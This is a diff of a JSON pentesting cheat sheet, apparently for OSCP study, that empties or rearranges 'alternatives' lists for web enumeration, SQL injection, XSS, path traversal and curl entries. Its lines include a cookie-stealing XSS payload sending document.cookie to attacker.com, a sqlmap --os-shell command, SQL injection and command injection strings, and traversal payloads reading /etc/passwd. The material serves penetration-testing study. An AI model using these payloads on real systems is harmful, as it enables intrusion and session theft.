@@ -65,11 +65,7 @@
         "Try authenticated scan if 401/403: gobuster dir -u <URL> -w <WORDLIST> -c 'Cookie: session=<SESSION_TOKEN>'",
         "Check for backup files: gobuster dir -u <URL> -w <WORDLIST> -x bak,old,~"
       ],
-      "alternatives": [
-        "dirb <URL>",
-        "ffuf -u <URL>/FUZZ -w <WORDLIST>",
-        "wfuzz -u <URL>/FUZZ -w <WORDLIST>"
-      ],
+      "alternatives": [],
       "notes": "Adjust extensions based on technology stack",
       "oscp_relevance": "high"
     },
@@ -125,11 +121,7 @@
         "Test specific vulnerabilities found",
         "Check server version for exploits: searchsploit <server> <version>"
       ],
-      "alternatives": [
-        "whatweb -v <URL>",
-        "wapiti -u <URL>",
-        "nuclei -u <URL>"
-      ],
+      "alternatives": [],
       "notes": "Can be slow but thorough",
       "oscp_relevance": "medium"
     },
@@ -196,11 +188,7 @@
         "Get shell: sqlmap -u '<URL>' --os-shell",
         "Try different techniques: sqlmap -u '<URL>' --technique=U"
       ],
-      "alternatives": [
-        "sqlmap -r request.txt --batch",
-        "manual SQLi testing",
-        "burp suite scanner"
-      ],
+      "alternatives": [],
       "notes": "Save Burp request to file for complex requests",
       "oscp_relevance": "high"
     },
@@ -245,11 +233,7 @@
         "Use sqlmap for automation: sqlmap -u '<URL>?param=value'"
       ],
       "alternatives": [
-        "' OR '1'='1",
-        "\" OR \"1\"=\"1",
-        "' OR 1=1#",
-        "admin'--",
-        "' OR 1=1 LIMIT 1--"
+        "admin'--"
       ],
       "notes": "Try with both single and double quotes",
       "oscp_relevance": "high"
@@ -308,9 +292,7 @@
         "Test for command injection: <URL>?<PARAM>=;id"
       ],
       "alternatives": [
-        "ffuf -u '<URL>?FUZZ=test' -w <WORDLIST>",
-        "burp intruder",
-        "param-miner"
+        "burp-intruder"
       ],
       "notes": "Filter by response size or status code",
       "oscp_relevance": "medium"
@@ -352,13 +334,8 @@
         "Steal cookies: <script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>",
         "Check stored XSS in forms/comments"
       ],
-      "alternatives": [
-        "<img src=x onerror=alert(1)>",
-        "<svg onload=alert(1)>",
-        "\"><script>alert(1)</script>",
-        "<body onload=alert(1)>"
-      ],
-      "notes": "Check if input is reflected in response",
+      "alternatives": [],
+      "notes": "Check if input is reflected in response\n\nAlternative Techniques:\n- \"><script>alert(1)</script>",
       "oscp_relevance": "medium"
     },
     {
@@ -398,12 +375,9 @@
         "PHP filter wrapper: php://filter/convert.base64-encode/resource=index.php"
       ],
       "alternatives": [
-        "....//....//etc/passwd",
-        "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
-        "%252e%252e%252f",
-        "file:///etc/passwd"
+        "%252e%252e%252f"
       ],
-      "notes": "Try with null byte (%00) termination",
+      "notes": "Try with null byte (%00) termination\n\nAlternative Techniques:\n- ....//....//etc/passwd\n- ..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts\n- file:///etc/passwd",
       "oscp_relevance": "high"
     },
     {
@@ -460,11 +434,7 @@
         "Use cookies: curl -b cookies.txt <URL>",
         "Follow redirects: curl -L -X POST -d 'data' <URL>"
       ],
-      "alternatives": [
-        "wget --post-data '<PARAM>=<VALUE>' <URL>",
-        "httpie POST <URL> param=value",
-        "python requests.post()"
-      ],
+      "alternatives": [],
       "notes": "Use -H for custom headers",
       "oscp_relevance": "medium"
     },
@@ -510,11 +480,7 @@
         "Look for technology-specific vulnerabilities",
         "Adjust wordlists based on technology (PHP, ASP, JSP)"
       ],
-      "alternatives": [
-        "wappalyzer browser extension",
-        "builtwith.com",
-        "curl -I <URL>"
-      ],
+      "alternatives": [],
       "notes": "Essential for finding version-specific exploits",
       "oscp_relevance": "high"
     }
